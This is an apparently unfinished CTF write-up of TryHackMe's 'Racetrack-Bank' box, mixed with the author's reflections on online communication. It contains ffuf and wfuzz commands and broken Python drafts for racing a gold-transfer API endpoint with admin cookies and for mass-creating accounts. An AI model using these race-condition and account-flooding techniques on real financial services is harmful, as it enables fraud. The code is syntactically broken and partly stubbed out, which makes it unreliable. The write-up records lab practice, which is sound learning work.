# Racetrack-Bank Helped-Through

Name: Racetrack-Bank
Date:  23/01/2023
Difficulty:  Hard
Goals:  
- Learn about how custom exploits creating
- Practice social interaction over chats online - Promote "**stop!** listen - and ask good questions"  - ask 5 questions one per section of the box 
- Practice social interaction over text chat - research tips from actually white papers, experts in SE
Learnt:
Beyond Root:
- Being a better digital communicator; use all you have research to script out in a one-take improv of a chat discourse were you are try to explain this machine in two sentences maximum per interaction the box, self moderating tone and content.

Digital communication via Chats and DMs is not a strength of mine. I am people person with good SE, where most of the modern world post covid spent their days on Zoom and Discord, I was on the front lines talking to people. I know I have some catching up to do in that respect. These channels of communication will not go away. [Cthulhu Cthursday: TryHackMe's "RacetrackBank"](https://www.youtube.com/watch?v=mF2HJq4kaVE) will be a practice and further research os Online Social Skill 101 ++;  I made an arse of myself twice - being incorrect in the hope of helping, decided not pollute the evening or anyone elses and consider how to actually communicate over chat. My conclusions being that it is just of context - set and setting issue tied to wanting to be social in with other that like this stuff while I never have used chat on phones or discord, twitch, twitter, facebook. Email is just glorifed letters that make people waste their time deleting them. Decided I did not want this inital failure to be damaging as it copuld have been during turning almost user on [[Support-Helped-Through]] will is imperative practice being chat without being in chat and research how to connect my provably excellent social skills in-person to online.  

#### Question 1 

Without giving away of your TTPs for KOTH, but what was the most interesting KOTH TTPs that wrinkled your brain really hard during a KOTH or varients?  
-> Reduce and more open:
- Most interesting KOTH stories and TTPs witnessed or heard of?

## Recon

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](Screenshots/ping.png)



The Root Web Page on port 80.
![1080](rootwebpage.png)

API to fuzz
![](apidirectory.png)

```bash
ffuf -u http://10.10.53.115/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-seen-in-wild.txt:FUZZ
```

![1080](bigadminaccountcreation.png)

Account tiering is present
![1080](weneedoneofthese.png)
For some reason chat really likes ZAP and Al really does not like ZAP. 

Jason Haddix uses ZAP in the most recent Web Hacking methodology for Bug Hunting  
![1080](nogiveselfgold.png)

Either we make lot of accounts to make one pool of Gold
![1080](apiendpointdisclosed.png)
Vulnerabiliies mentioned by chat
1. Give Self 
2. Integer Overflow
3. Create 10k accounts and give accounts.
4. Race conditions 
	- An exploitable condition that race the backend server to completing this condition. 
		- Attempt to run two ffuf/wfuzz:
			- One of each account to pass gold from target before other account

1. 



```bash
for i in seq {0..9999}; do echo "1" >> 10kOnes.txt; done
```


Wfuzz and ffuf commands
```bash
BIGADMINCOOKIE=
LITTLEADMINCOOKIE=
PAYLOAD=10kOnes.txt
HOST="10.10.10.10"
# Wfuzz - bigadmin
wfuzz -H 'Cookie: connect.sid=$BIGADMINCOOKIE' -d 'user=$USER$&amount=1&addition=FUZZ' -u http://$HOST/api/givegold -X POST -w $PAYLOAD3 -t 5
# ffuf 
ffuf -u http://$HORT/api/givegold -X POST -b 'Cookie: connect.sid=$COOKIE' -d 'user=USER&amount=1&addition=FUZZ' -t 5
```


```python 
import multiprocessing as mp
import threading, os subprocess
from typing import Any, Awaitable

async def run_sequence(*functions: Awaitable[Any]) -> None:
for function in functions:
	await function



async def create_subproc(cmd, args):
process = subprocess.Popen(["{cmd}", "{args}"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
process.wait()

async def exec_racecond_exploit(host, api_endpoint, data_field_one, data_field_dst, cookie_src, cookie_dst, method, thread_amount):
with open(payload, "r") as f:
            words = f.read()
			for i,word in enumerate(words):
src_args = f"http://{host}/{api_endpoint} -d \'{data_field_src}&payload={word}\' -b \'Cookie: {cookie_src}\' -X {method}"
dst_args = f"http://{host}/{api_endpoint} -d \'{data_field_dst}&payload={word}\' -b \'Cookie: {cookie_dst}\' -X {method}"
	await run_sequence(
		create_subproc("curl", src_args),
		create_subproc("curl", dst_args),
					  )


def main():


# Cookie provide all but "Cookie: " 
BIGADMINCOOKIE = ""
LITTLEADMINCOOKIE = ""
# filepath to payload to fuzz through this only matters for amount of words in the wordlist that is called payload for the field in the data curl sends 
PAYLOAD = "10kOnes.txt"
HOST = f"10.10.10.10"

exec_racecond_exploit()


os.exit()

```





##### Question 2 


## Exploit

##### Question 3 
## Foothold
##### Question 4

## PrivEsc
##### Question 5

## Beyond Root

##### Question 6
What mitigations and redemiation would you write in a report fix this exploit? 

## One Account to Rule them all!

```bash
for num in seq {0..9999}; do
echo "user$num" >> users.txt
done
```

```python 
import asyncio, threads, os, requests

def open_users():

def create_account():

def login_and_give_gold():

def main():
	password = "asd"
	target_account = "PoolOfGold"
	create_account(target_account)
	# password = open_passwords()
	users = open_users()
	# Enum or loop
	
		create_account(name)
		login_and_give_gold(target_account)
		
	
```